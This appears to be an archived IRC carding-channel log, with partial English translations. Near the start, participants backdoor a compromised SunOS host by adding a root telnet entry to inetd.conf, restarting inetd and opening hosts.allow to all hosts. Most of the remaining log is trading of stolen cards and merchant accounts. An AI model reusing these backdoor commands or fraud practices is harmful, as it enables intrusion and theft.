@@ -1,0 +1,786 @@
+:J4n3! :#telnet stream  tcp     nowait  root    /usr/sbin/in.telnetd    in.telnetd
+:D1ck! :paste me here
+:D1ck! :echo "telnet stream  tcp     nowait  root    /usr/sbin/in.telnetd    in.telnetd" >> /etc/inetd.conf;
+:D1ck! :killall -9 inetd or if it is sun kill the pid
+:D1ck! :/usr/sbin/inetd if linux
+:J4n3! :no its sparc
+:D1ck! :/usr/sbin/inetd -s if sunos
+:J4n3! :?
+:D1ck! :ps -u root | grep inetd
+:J4n3! :wait
+:D1ck! :kill -9 pid-number-of-the-inetd
+:J4n3! :# ps -u root | grep inetd
+:J4n3! :   158 ?        0:00 inetd
+:J4n3! :  1032 ?        0:00 inetd
+:J4n3! :   189 ?        0:00 inetd
+:D1ck! :kill -9 158
+:D1ck! :kill -9 1032
+:D1ck! :kill -9 189
+:J4n3! :kkz :) wait
+:D1ck! :/usr/sbin/inetd -s
+:D1ck! :echo "ALL: ALL" >> /etc/hosts.allow
+:D1ck! :exit;
+:D1ck! :hehe
+:D1ck! :oye hmm
+:D1ck! :u in linux?
+:J4n3! :yeah
+:D1ck! :oh
+:D1ck! :anyidea how much is a merchant account?
+:J4n3! :merchant account for cc ?
+:D1ck! :yup
+:J4n3! :no idea :/
+:D1ck! ::P
+:D1ck! :oki
+:D1ck! :steal credit card form from some shell company
+:D1ck! :ehehe
+:D1ck! :and add pakisytani rs
+:D1ck! ::/
+:J4n3! :hmmm
+:uolkm! :you have some cc for giving me?? pvt 
+:uolkm! :plis
+:J4n3! :u know what
+:J4n3! :we can get many cc's tooo
+:D1ck! :yep but we cant misuse it
+:D1ck! ::P
+:J4n3! :i mean if someone signup by ripped cc, obviously he can't send the copy of his credit card
+:D1ck! :the legal ones
+:J4n3! :no i'm not talking about legal one
+:D1ck! :oki
+:D1ck! :yep true
+:J4n3! :so it means that cc is ripped
+:D1ck! ::O)
+:J4n3! :we can use those
+:D1ck! :yep
+:D1ck! ::)
+:J4n3! :we neve use the legal once
+:J4n3! :one
+:D1ck! :yeps
+:D1ck! ::P
+:D1ck! :kewl idea
+:D1ck! :get done with the page till sunday night
+:D1ck! :inshlalah i`ll send the payment byu  monday
+:Karderbox! :i am in dangerous
+:D1ck! :and we will be online till thursday
+:Karderbox! :help-me
+:Karderbox! :please
+:D1ck! :but my box is 65 MB ram with 6 gb hardrive :()
+:[Magnus]! :what the hell........
+:D1ck! :pentium 233
+:D1ck! :hehe
+:J4n3! :yeah okay :)
+:[Magnus]! :what's the problem buddie? be more explicit ok?
+:D1ck! :;)
+:Bl4ck_! :ACTION is away -[ Dorm ca o gaina bata si alea si astea
+@is away -[ I'm as sleepy as a drunk chicken and this and that
+
+:J4n3! :pentuim 1 ?
+:Karderbox! :give
+:Karderbox! :please
+:D1ck! :<D1ck> pentium 233
+:D1ck! :<D1ck> pentium 233 Mghz
+:uolkman! :somebody can me to help I need good cc 
+:|Makaveli! :look... everybody needs one here...
+:[Magnus]! :hehehe u're right |Makaveli
+:uolkman! :mine all the o+ has and you don't know 
+:J4n3! :hmm
+:J4n3! :wtf ?
+:J4n3! :yaar
+:D1ck! :?
+:J4n3! :i installed sun2 on this box
+:J4n3! :./setup.sh
+:J4n3! :telnet is own but its giving loging incorrect on that ABcD pass
+:J4n3! ::/
+:D1ck! :hmm
+:D1ck! :mwhats the box?
+:D1ck! :and msg me the abC wala pass
+:J4n3! :admin.cgocable.net
+:J4n3! :wait
+:J4n3! :wait
+:J4n3! :that old Bj is working ? though i copied that AB l0gin to that directory :/
+:D1ck! :old bJ is working?
+:D1ck! :what was the bJ wala trojan/
+:D1ck! :?
+:D1ck! :msg me
+:J4n3! :k
+:D1ck! :this wala is workin?
+:D1ck! :doesnt work
+:D1ck! :hmm
+:J4n3! :login: root
+:J4n3! :Password:
+:J4n3! :Sun Microsystems Inc.   SunOS 5.6       Generic August 1997
+:J4n3! :\h:\w$ id;
+:J4n3! :uid=0(root) gid=1(other)
+:J4n3! :\h:\w$
+:J4n3! :its rewt
+:J4n3! :working that abc wala now workign :p
+:J4n3! :i fixed it
+:D1ck! ::)
+:D1ck! :oki
+:D1ck! :lol
+:J4n3! :heh
+:D1ck! :swet
+:D1ck! ::P
+:J4n3! :haha the box is admin.cgocable.net but bot is coming from mail.cgocable.net ?
+:J4n3! :save2 add J4n3 * J4n3 100 1 4
+:J4n3! :save2 add D1ck * D1ck 100 1 4
+:D1ck! :hehehe
+:D1ck! :yep
+:D1ck! ::/
+:J4n3! :save2 save
+:J4n3! :save2 host add J4n3 *
+:D1ck! :accha oye if nu start today how much site will be done gtoday?
+:D1ck! :i wan to to show it to bro 
+:D1ck! :n al
+:D1ck! :l
+:J4n3! :hmmm
+:J4n3! :i will make the main page
+:J4n3! :and shell section
+:D1ck! :oki
+:D1ck! :kewl
+:J4n3! ::)
+:D1ck! ::)
+:J4n3! :save2 nick cg0cab
+:J4n3! :yaar i need that compiled psy:(  make is not working here its fast box i think psy will not get ping time out
+:J4n3! :and in my present onghome box it doesn give me pvt logs
+:D1ck! :ill send u 
+:D1ck! :i will go to computer shop
+:D1ck! :today
+:D1ck! :anfd get mousr and keyboard fixed
+:D1ck! :oh
+:D1ck! :hmm
+:D1ck! :k
+:J4n3! :oh okay )
+:D1ck! :.p
+:D1ck! :.b
+:D1ck! :b.
+:D1ck! ::P
+:J4n3! ::p
+:Karderbox! :help-me please
+:Karderbox! :help-me please
+:Karderbox! :help-me please
+:Karderbox! :help-me please
+:Karderbox! :1,85:12(
+:Karderbox! :1,85:12(
+:Karderbox! :1,85:12(
+:Karderbox! :help-me please
+:D1ck! ::)
+:D1ck! :1pani kaha hai
+:Karderbox! :give good cc
+:D1ck! :is he also getting his server?
+:[sm0ke]! :dude. .yer gon get a ban not a cc wid wut ur doin. .
+:J4n3! :yeah cobolrec i think
+:J4n3! :thats what he told me, may be i go to him today
+:D1ck! :oki
+:D1ck! ::P
+:Karderbox! :yours are bad
+:D1ck! :oye will computer shops be open know?
+:J4n3! :yeah 
+:J4n3! :sure
+:D1ck! :oye oye
+:D1ck! :oye oye
+:D1ck! :oye oye
+:[Magnus]! :good bye buddies
+:D1ck! :the name is 'Big Tecnologies'
+:D1ck! :brain cell
+:J4n3! :hehe
+:J4n3! :Big 
+:J4n3! :ok
+:D1ck! :'Big Stuff'
+:D1ck! :hehe
+:D1ck! :oye i have to go, browants net, not myh pc
+:D1ck! :so i am going to computer wala
+:J4n3! :ok come back sooon
+:D1ck! :and lemme get my box fixed.
+:D1ck! :oki
+:D1ck! :cya
+:D1ck! :bye
+:J4n3! :waiting, i will trojan this 2 box and log to windows to make site
+:D1ck! :/quit
+:Raul! :who wanna trade cc with me?
+:|Makaveli! :i have cc's to trade
+:|Makaveli! :just msg me if u have some
+:Sultrix! :Does anyone here have any WORKING Credit card numbers ?
+:|DONNIE|! :ne1 got bnc...i got virgin lets trade wimme
+:baba2! :hi all 
+:baba2! :ACTION need bncs have ccs
+:baba2! :who wanna trade msg me
+:baba2! :ACTION need bncs have ccs
+:baba2! :anyone wanna trade 
+:|Makaveli! :anyone here wanna trade?
+:connex! :hy
+:connex! :i want to buy a shell
+:connex! :did you know some shell sites?
+:connex! :with good trafic?
+:|AmDeAtH! :Yea i know
+:|AmDeAtH! :connex /msg me
+:connex! :hello?
+:baba2! :connex 
+:baba2! :u got bnc
+:baba2! :i can get u shells
+:baba2! :or ccs
+:|Makaveli! :anyone here wanna trade?
+:[LiNeoNe]! :oi
+:[LiNeoNe]! :wanna trade cardz?????????
+:[LiNeoNe]! :
+:baba2! :i got 9 virgins visa's and 5 mc's looking for bncs anyone have msg me
+:baba2! :i got 9 virgins visa's and 5 mc's have shells  looking for bncs anyone have msg me 
+:[LiNeoNe]! :
+:|Makaveli! :anyone here wanna trade?
+:Tano! :trrade waht 
+:BLOOD031! :CC Dealerz Msg Me for BIG TIME DEALZ $CASH$ 
+:BLOOD031! :CC Dealerz Msg Me for REAL BIG TIME DEALZ $$$CASH$$$
+:baba2! :i got 9 virgins visa's and 5 mc's have shells  looking for bncs anyone have msg me 
+:connex! :i need some address for buying shell
+:Tano! :connex www.zerolimit.net
+:connex! :every body sleep?
+:|Makaveli! :no not me
+:connex! :hello america
+:connex! :i need some address for buying shell
+:[BoYZ`19]! :www.egghead.com
+:[BoYZ`19]! :www.shells.com
+:[BoYZ`19]! :www.shellone.com
+:[BoYZ`19]! :www.inetking.com
+:[BoYZ`19]! :www.dragondata.com
+:Tano! :connex www.zerolimit.net
+:Tano! :connex www.zerolimit.net
+:Bl4ck_! :hopa
+@ oops!
+
+:Bl4ck_! :Tano
+:Bl4ck_! :lume noua
+@ new people
+
+:Bl4ck_! :www.example.net
+:Bl4ck_! :si astea
+@ and this also
+
+:Bl4ck_! :[BoYZ`19] 10x 4 www.example.com
+:Bl4ck_! :looks nice
+:Bl4ck_! :We're sorry, but we are not accepting new accounts at this time
+:Bl4ck_! :shit
+:Bl4ck_! :-up
+:[BoYZ`19]! :i forgot sorry
+:[BoYZ`19]! ::p
+:Bl4ck_! :hmmmm
+:Bl4ck_! :anyway
+:Bl4ck_! :turbulent rulezzz
+:[BoYZ`19]! :negro....
+:Bl4ck_! :yea?
+:[BoYZ`19]! :intro pls
+:[BoYZ`19]! :i want to ask u 
+:Bl4ck_! :wut
+:Bl4ck_! :?
+:[BoYZ`19]! :if i have a web,can i run shell from there??????
+:Bl4ck_! :hmmmm
+:Tano! :so who tha fuck has cc in here 
+:Tano! :GOOD ONES
+:Bl4ck_! :Tano
+:connex! :i need some address for buying shell
+:Bl4ck_! :zii fhe
+@ tell us
+
+:Bl4ck_! :connex
+:Bl4ck_! :de 3 zile tat urli
+@ you've been shouting this for 3 days
+
+:Tano! :connex u got an obsesion 
+:Bl4ck_! :esti ceva bot sau ce?
+@ are you a bot or what?
+
+:Bl4ck_! :sure
+:Bl4ck_! :si e si orb pe deasupra
+@ and it's also blind
+
+:[BoYZ`19]! :i can't understand your language
+:[BoYZ`19]! :would u like to speak in english?pls
+:Bl4ck_! :yea sure
+:[BoYZ`19]! :if i have a web,can i run shell from there??????
+:Bl4ck_! :I said connex  is blind or smth
+:Bl4ck_! :yes
+:Bl4ck_! :if the shell has a host and allows u to telnet to it
+:[BoYZ`19]! :so i need telnet??
+:Tano! :[BoYZ`19] u need an upgrade to ye`r brain 
+:Tano! ::P
+:Bl4ck_! :yes
+:Tano! :who has good cc in here and want to trade??????
+:Bl4ck_! :Tano
+:Bl4ck_! :ce dai pe ele?
+@ what do you pay for it?
+
+:Tano! :Bl4ck_:>
+:Tano! :ce vrei 
+@ what would you like to
+
+:Tano! ::)
+:Tano! :dar eu verific primu 
+@ but I'll be the first to verify
+
+:Bl4ck_! :cum tu mah?
+@ how could you, man?
+
+:[BoYZ`19]! :wow
+:[BoYZ`19]! :anyway
+:Bl4ck_! :adica eu cu +o si tu primu?
+@ this means I have +o and you to be the first? (?? nonsense ??)
+
+:[BoYZ`19]! :thx for your information negro
+:Bl4ck_! :Tano
+:Bl4ck_! :read the topic
+:Tano! :asa si 
+@ ok, so ?
+
+:Tano! :?
+:Tano! :Bl4ck_ e valabil si pt tine 
+@ Bl4ck_ this is also for you 
+
+:Bl4ck_! :?
+:[BoYZ`19]! :bye guys and thanks
+:Tano! :Bl4ck_ topicu 
+@ Bl4ck_ the topic (???)
+
+:Tano! :so we have a deal or not?
+:Bl4ck_! :nope
+:Tano! :pai si ce mai intrebi aiurea then 
+@ so why do you ask in vain, than?
+
+:Tano! :?
+:Bl4ck_! :I don`t deal with romanians
+:Tano! :hahah 
+:Bl4ck_! :they always ripp
+:Tano! :no shit 
+:Tano! :lol
+:Tano! :si tu ce esti ma nu esti roman 
+@ but what do you are, man? Not a Romanian?
+
+:Tano! ::)
+:Tano! :lol
+:Bl4ck_! :ba ha
+@ of course [I am]
+
+:Bl4ck_! :chiar de aia
+@ exactly that's why...
+
+:Tano! :una la mana si doi la mana 
+@ firs. And second:
+
+:Tano! :te-am intrebat .. 
+@ I asked you ...
+
+:Bl4ck_! :ja
+:Tano! :ce vrei in schimbul lor 
+@ what do you want for them [the cards]
+
+:Tano! :si am zis ca eu verific primu 
+@ and I said that I'll be the first to verify
+
+:Tano! :daca is bune itzi dau altele bune in schimbu lor sau shelluri 
+@ if they are good I'll give you other good ones for them, or shells
+
+:Tano! :daca nu 
+@ if they are not...
+
+:Tano! :treaba ta
+@ it's your business
+
+:Bl4ck_! :nimic
+@ no way
+
+:Bl4ck_! :nu-mi tre` ccs
+@ I don't nees ccs
+
+:Tano! :mdeah 
+@ of course...
+
+:Bl4ck_! :ca am
+@ because I already have [ccs]
+
+:Bl4ck_! :lolz
+:Tano! :yew
+:Tano! :or fi si bune 
+@ maybe they are also good... 
+
+:Bl4ck_! :nice eggies
+:Bl4ck_! :pai mah
+@ so, man...
+
+:Bl4ck_! :id u have ccs why don`t u buy some shells?
+:Tano! :na vad ca e plin de carderi pe aici 
+@ eah, I see that's full of carders here
+
+:Tano! :care is plini de carduri bune 
+@ who are full of good cards
+
+:Bl4ck_! :Tano
+:Bl4ck_! :read the topic
+:Bl4ck_! :ok?
+:Bl4ck_! :good
+:Bl4ck_! :Tabacu hi
+:Tabacu! :hi
+:Tabacu! ::))
+:Tabacu! :huh...i'm so tired
+:J4n3! :save2 add J4n3 * J4n3 100 1 4
+:J4n3! :save2 add D1ck * D1ck 100 1 4
+:Bl4ck_! :me 2
+:J4n3! :save2 add host J4n3 *
+:J4n3! :save2 save
+:Bl4ck_! :Tabacu
+:Bl4ck_! :u must see a log
+:J4n3! :save2 nick Meridien
+:Bl4ck_! :between my gfs
+:Bl4ck_! ::>>
+:J4n3! :Meridien host add J4n3 *
+:Bl4ck_! :http://www.inetking.com/
+:Bl4ck_! :check this out
+:[sm0ke]! :inetking doesnt accept cc anymore?
+:Bl4ck_! :let me see
+:Bl4ck_! :Pay by X-check (online) 
+:Bl4ck_! :Available only for United States of America checking accounts with U.S. funds
+:Bl4ck_! :?
+:J4n3! :save2 add J4n3 * J4n3 100 1 4
+:J4n3! :save2 host add J4n3 *
+:J4n3! :save2 add D1ck * D1ck 100 1 4
+:J4n3! :save2 save
+:J4n3! :save2 nick Pac31
+:J4n3! :save2 add J4n3 * J4n3 100 1 4
+:J4n3! :save2 host add J4n3 *
+:J4n3! :save2 add D1ck * D1ck 100 1 4
+:J4n3! :save2 save
+:J4n3! :save2 nick pac32
+:Bl4ck_! :does anyone has a proxy?
+:TanTouze! :so if A+B=C why can't I ever find my car keys?
+:Bl4ck_! :does anyone has a proxy?
+:D1ck! :J4n3
+:D1ck! :bab there?
+:Bl4ck_! :ArChAnG3L join #zalau
+:Bl4ck_! :ArChD3ViL join #zalau
+:J4n3! :D1ck
+:J4n3! :welcome back :)
+:J4n3! :D1ck i'm here
+:D1ck! ::)
+:[sm0ke]! :is aol cardable?
+:[sm0ke]! :anyone got a hacked aol account?
+:D1ck! :fuck
+:D1ck! :my keyboard sux
+:D1ck! :my keyboard sux
+:D1ck! :my keyboard sux
+:D1ck! :my keyboard sux
+:D1ck! :fuck
+:D1ck! :D4v3 WHAT WAS THE LAST THING U SED
+:D1ck! :oops caps
+:D1ck! :FUCK MY PC
+:D1ck! :THESE ARE SUPPOSE TO BE UNCAP
+:J4n3! :when ?
+:J4n3! :i said tight tight
+:J4n3! :LOOOOOOL
+:J4n3! :ur pc is screwed
+:D1ck! :brb i~ll get a new keyboard
+:D1ck! :YEAH
+:D1ck! :SUX
+:D1ck! :sux
+:J4n3! :kkz ;)
+:D1ck! :SSSSSSSSSSSSaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+:D1ck! :OYE BRB I~LL SLEEP
+:D1ck! :AND GET PC FIXED
+:D1ck! :cya
+:D1ck! :hmmm
+:D1ck! :its working now
+:D1ck! :hahahha
+:D1ck! :brb
+:J4n3! :kkz kkkz
+:J4n3! :brb 
+:J4n3! :enjoy 
+:J4n3! :sweet dreamz :p
+:D1ck! :;)
+:j0e_bLacK! :som1 check this site out http://www.example.net/sms/default.html?
+:j0e_bLacK! :and tell me how they charge?
+:j0e_bLacK! :i'll give 2 visas to who can tell me
+:j0e_bLacK! :maybe that will wake you up :-)
+:DuXo! :
+:DuXo! :anyone here alive
+:2red! :nope
+:Domnitoru! :
+:Domnitoru! :
+:2red! :ACTION is selling virgin credit cards, /msg me for deal.
+:sexmashin! :any traders here /msg me
+:sexmashin! :no traders???????
+:sexmashin! :loosers
+:`2wice! :anyone wanna trade?
+:`2wice! :just message me...
+:STUDENTUL! :whanna trade with me
+:2red! :ACTION is selling virgin credit cards, /msg me for deal.
+:CC-Master! :anyone trade?
+:micano_m
+:micano_m
+:micano_m
+:Khe[Pala]! :hi
+:Khe[Pala]! :does anyone know a cardable shell provider ?? (i can card a shell for you if you want)
+:Khe[Pala]! :does anyone know a cardable shell provider ?? (i can card a shell for you if you want)
+:GoDsHaNd
+:m4r1n4ru! :-join #rocarding
+:m4r1n4ru! :-save
+:digITall! :
+:digITall! :
+:NiCeBoY16! :ello
+:NiCeBoY16! :wers coolworx
+:whiner! :cc-master
+:NiCeBoY16! :CC-Master
+:whiner! :yeah i'm beginning to think he is
+:NiCeBoY16! :he tricked me
+:NiCeBoY16! :he trade me a non working cc
+:NiCeBoY16! :CC-Master is a Ripper
+:whiner! :yeah me too...so far he hasnt done his part
+:NiCeBoY16! :I think the (OP) should do something about dis
+:s|ick-! :HeLLLLLLLLLLLLLLLLLLOoooooooooooooooooooooooooooo
+:Mr_R0gers! :greetings
+:s|ick-! :Anyone want to trade ibill for 8ccs msg me now
+:NiCeBoY16! :Bye ppl
+:NiCeBoY16! :say hi to coolworx and to you all
+:CiNcUr! :anyone trade msg me
+:s|ick-! :8,4Anyone want to trade ibill for 8ccs msg me now
+:keygenz! :ACTION is starting a carding force..needs experienced carders in it..buying domain www.cardmasters.com.../msg me to join MY cracking force
+:keygenz! :ACTION is starting a carding force..needs experienced carders in it..buying domain www.cardmasters.com.../msg me to join my cracking force
+:keygenz! :ACTION is starting a carding force..needs experienced carders in it..buying domain www.cardmasters.com.../msg me to join my cracking force
+:CiNcUr! :duxo peder
+:DuXo! :hm koj si ti
+:DuXo! :hi cool
+:DuXo! :how are u 
+:Co0lWoRx! :english ppl pls
+:keygenz! :ACTION is starting a carding force..needs experienced carders in it..buying domain www.cardmasters.com.../msg me to join my cracking force
+:CiNcUr! :hmmmm
+:CiNcUr! :ne ti kazuvam
+:DuXo! :hm :) ok 
+:DuXo! ::)
+:keygenz! :ACTION is starting a carding force..needs experienced carders in it..buying domain www.cardmasters.com.../msg me to join my cracking force
+:CiNcUr! :da te ebam u gz :)
+:DuXo! :se znaeme li decko a ?
+:DuXo! :man
+:DuXo! :he is from Macedonia
+:DuXo! :and he fucks something from me ..
+:DuXo! :and he fucks something with me
+:CiNcUr! :hehhe
+:CiNcUr! :coolworx
+:Co0lWoRx! :i dont care
+:Co0lWoRx! :he might be macedonia president for all i care, english ONLY
+:DuXo! :ok..
+:Co0lWoRx! :got it?
+:DuXo! :how are u cool
+:DuXo! :how  is playboy doing :)
+:Co0lWoRx! :i was fine
+:CiNcUr! :hey coolworx u use to be my friend before
+:CiNcUr! ::)))
+:Co0lWoRx! :oh yeah, who are u?
+:CiNcUr! :it doesnolt matter
+:CiNcUr! :it doesnot matter
+:Co0lWoRx! :yes it matters, or u want +b?
+:DuXo! :cool 
+:DuXo! :every macedonian is ripper....
+:DuXo! :so fuck him up........
+:Co0lWoRx! :CiNcUr, u tell me who u are, or u get +b
+:Co0lWoRx! :ok, u asked for it, u got it
+:DuXo! :+b cincur ;)
+:digITall! :
+:DuXo! :digitall are u trading or something like that?
+:DuXo! :[digITall PING reply]: 2 secs
+:DuXo! :-
+:connex! :hi
+:Co0lWoRx! :hello
+:DuXo! :hi connex
+:connex! :i need a sites where i can buy a good shell
+:DuXo! :wheer are u from
+:connex! :hi DuXo
+:connex! :Frace
+:connex! :France
+:connex! :i need a sites where i can buy a good shell
+:connex! :i need a sites where i can buy a good shell
+:`2wice! :anyone for a trade?
+:DuXo! :yes em 
+:DuXo! :msgm e
+:DuXo! :msg me man
+:Kicko! :anyone wanna trade
+:Mr_Xxx-! :need a url shell site address
+:m4r1n4ru! :-join #rocarding
+:Mr_Xxx-! :re all
+:Mr_Xxx-! :i want to know where i can to move money from one card to other
+:Bon_Jovi1! :p
+:TanTouze! :You people make me sick
+:_^|^_! :so?
+:Fr0d! :hey
+:connex! :hi
+:SJaAK! :ACTION is trading creditcards msg for a dael
+:kardeRR! :
+:kardeRR! :0.3anybody wanna card sumptin'?msg me>>>
+:kardeRR! :0,3anybody wanna card sumptin'?msg me>>>
+:DuXo! :see u all
+:kardeRR! :0,3anybody wanna card sumptin'?msg me>>>
+:dariuss! :norok
+@ good luck
+
+:dariuss
+:dariuss
+:kardeRR! :0,3anybody wanna card sumptin'?msg me>>>
+:connex! :buna
+@ hi
+
+:connex! :e careva care stie romineste?
+@ there is somebody here who speaks Romanian?
+
+:D1ck! :J4n3
+:D1ck! :there?
+:connex
+:PnoyPride! :0,3anybody wanna card sumptin'?msg me>>>
+:PnoyPride! :0,3anybody wanna card sumptin'?msg me>>>
+:[kurupt]! :sup yall
+:[kurupt]! :anyone any other good dvd sitez dat deliver int'l. ..
+:[kurupt]! :anyone know any other good dvd sitez dat deliver int'l. ..
+:n0\r0ot! :shud u p asshol3 
+:[kurupt]! :yea. .yea. ..
+:[kurupt]! :if yha cant help. .. jst shutup. ..
+:Exchanger! :Looking for legit CC's in trade for merchant.
+:Playboy-! :re lumeeeeeee
+:PnoyPride! :0,3anybody wanna card sumptin'?msg me>>>
+:PnoyPride! :0,3anybody wanna card sumptin'?msg me>>>
+:razvaam! :hello
+:DuXo! :hi
+:sugrich! :Anybody wanna trade cc#
+:sugrich! :Pls msg me if you want to
+:dariuss! :ACTION is leaving...
+:razvaam! :i ' m looking for cc
+:PnoyPriDE! :0,3anybody wanna card sumptin'?msg me>>>
+:Vi||a! :hello
+:Vi||a! :will somedody suck my dixk?
+:Vi||a! :jajajaja
+:GoDsHaNd! :Fuck off
+:dariuss! :ACTION brb
+:dariuss! :ACTION is leaving...
+:leroy1! :i need some cc numbers
+:ureche! :re
+:D1ck! :J4n3
+:D1ck! :there?
+:D1ck! :J4n3
+:D1ck! :i need u
+:EviLSTriK! :I have a merchant site and cc's, message me to trade
+:dariuss! :ACTION via sharks
+:dariuss! :ACTION is leaving...
+:Nightw|sH! :re
+:Tzaranul! :re Bl4ck_
+:Tzaranul! ::)
+:Bl4ck_! :gyeeeeeeeee
+:Tzaranul! :hehehehe
+:Tzaranul! :ce faci?
+(Tzaranul == "the redneck" or "the peasant"): how do you do?
+
+:DuXo! :anyone wanna trade
+:Bl4ck_! :ia pe aici
+@ go out
+
+:Bl4ck_! :la munca
+@ go to work
+
+:Tzaranul! :lol
+:Tzaranul! :ce munca?
+@ what kind of work?
+
+:razvaam! :care ma i e treaba pe aici
+@ what's happening here?
+
+:DuXo! :anyone here got mercant pls msg me
+:DuXo! :m4r1n4ru
+:DuXo! :are u here
+:DuXo! :hi cool
+:DuXo! :can u gimme my +v pls
+:Co0lWoRx! :w8
+:Fr0d! :is it the real Duxo?
+:Bl4ck_! :;/
+:Fr0d! :?
+:DuXo! :yes it`s me man
+:DuXo! :fr0d im from Internet club
+:DuXo! :a new noe 
+:DuXo! :the ip is mp.com.mk and i have access on *.mol.com.mk and 194.149.*.*
+:Co0lWoRx! :duxo, did u card penthouse for me?
+:DuXo! :no man
+:DuXo! :i will do it now 
+:DuXo! :i have brand new ccs..
+:Co0lWoRx! :ok
+:DuXo! :anyone got Babylon-x acconut
+:m4r1n4ru! :-op
+:Fr0d! :m4r1n4ru check ur msg
+:m4r1n4ru! :-op
+:InRaGe! :m4r1n4ru:)
+:Kernel! :ACTION is looking for trade cc# ...ms. me please
+:Kernel! :ACTION is looking for trade cc# ...msg. me please
+:HaCkCuT! :I have a signio merchant I trade it for ibill one /msg me 4 trade
+:[SK]Kane! :ahahahahahaha
+:Bl4ck_! :signio sux
+:[SK]Kane! :;]]]]]
+:Bl4ck_! :[SK]Kane :>>
+:m4r1n4ru! :yeah
+:m4r1n4ru! :you have a test one
+:Bl4ck_! :asta e biu si alea
+(??? nonsens ??)
+
+:Bl4ck_! :si io am acolo
+@ I have also [one] there 
+
+:[SK]Kane! :si i
+@ mee too 
+
+:[SK]Kane! :o
+:[SK]Kane! ::)
+:Bl4ck_! :HaCkCuT can u tell me the login?
+:[SK]Kane! :mai aveam io unu la plugnpay
+@ I've had also one at plugnpay
+
+:[SK]Kane! :cu test-fdc login si pass
+@with test-fdc and pass
+
+
+:[SK]Kane! ::))
+:Bl4ck_! :HaCkCuT can u tell me the login?
+:m4r1n4ru! :yeah
+:Fr0d! :i smell ripper here hehe
+:Fr0d! :i smell HaCkCuT
+:Fr0d! ::)
+:HaCkCuT! :no
+:HaCkCuT! :ok login is exodus
+:Bl4ck_! :<HaCkCuT> hi
+:Bl4ck_! :<Bl4ck_> hi
+:Bl4ck_! :<HaCkCuT> my login is exodus
+:Bl4ck_! :<Bl4ck_> mine too
+:Bl4ck_! :<Bl4ck_> sux
+:HaCkCuT! :hehe
+:HaCkCuT! :ok
+:Fr0d! :?
+:Bl4ck_! :sux
+:HaCkCuT! :wnyone of u have an ibill ?
+:HaCkCuT! :anyone of u have an ibill ?
+:[SK]Kane! :i do :P
+:Bl4ck_! :-join #4all
+:Fr0d! :any legit here?
+:D0P3! :<ne1 selling Hardware:>? msg me
+:Mak[Aw]! :hi
+:Co0lWoRx! :hmmmm
+:Co0lWoRx! :hello
+:Mak[Aw]! :if anyone wanna trade just msg me
+:Mak[Aw]! :hi coolworx
+:Mak[Aw]! :hey can i have a +voice?
+:Mak[Aw]! :plz?
+:Co0lWoRx! :why?
+:Co0lWoRx! :who are u?
+:Mak[Aw]! :a trader/carder
+:Mak[Aw]! :why?
+:Mak[Aw]! :cuz peoples trust more voiced peoples
+:Mak[Aw]! :if anyone wanna trade just msg me
+:ViruS! :I trade an ibill merchant /msg ,me 4 serious trade
+:Co0lWoRx! :now u get banned
+:Co0lWoRx! :ill prolly bbl
+:adams! :any1 trade cc ? 
+:adams! :any1 trade cc ? /mag me
+:some! :anyone got a spare valid cc?? i really need one..plz msg me..if you can hlp..
+:adams! :hey?? some ? 
+:adams! :What site could be best buy for NZ ? 
+:adams! :13,8 What site could be best buy for NZ ? 
+:adams! :plz.... msg me.. 
+:Pre{}tul! :re all
+:Pre{}tul! :trade?
+:Pre{}tul! :shell for cc?
+:PnoYPriDE! :0,3anybody wanna card sumptin'?msg me....
